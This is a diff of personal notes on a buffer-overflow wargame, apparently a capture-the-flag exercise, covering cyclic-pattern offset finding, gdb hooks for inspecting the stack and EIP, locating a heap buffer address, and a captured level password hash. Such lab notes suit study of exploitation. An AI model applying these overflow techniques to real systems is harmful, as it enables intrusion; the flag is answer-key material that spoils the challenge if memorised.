@@ -34,6 +34,7 @@ unhex 61616175 | rev ; echo ""
 uaaa
 
 cyclic -l uaaa
+
 80
 
 manually calculating the distance between the buffer start address and the EIP
@@ -89,8 +90,11 @@ echo  "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRS
 define hook-stop
 
 echo "---------------------------- esp -------------"
+
 x/40wx $esp
+
 echo "---------------------------- eip instructions -------------"
+
 x/2i $eip
 
 end
@@ -111,3 +115,35 @@ level3
 cat /home/user/level3/.pass
 
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+how to get the heap addr : \x08\x04\xa0\x08
+
+ ltrace ./level2
+ 
+ "pass a str" = = 0x0804a008 
+ 
+ other method:
+ 
+ smash the buffer to sigv by passin "a"s
+ 
+ (gdb) info proc mappings
+ 
+ heap addrs strat from  0x804a000 to 0x806b000
+ 
+ examin 8 addr
+ 
+ (gdb) x/8wx 0x804a000
+ 
+0x804a000:      0x00000000      0x00000069      0x61616161      0x61616161
+
+0x804a010:      0x61616161      0x61616161      0x61616161      0x61616161
+
+first apperance of 'a' = 
+
+(gdb) p/x 0x804a000 + 8 = 0x804a008
+ 
+ 
+ 
+ 
+ 
+
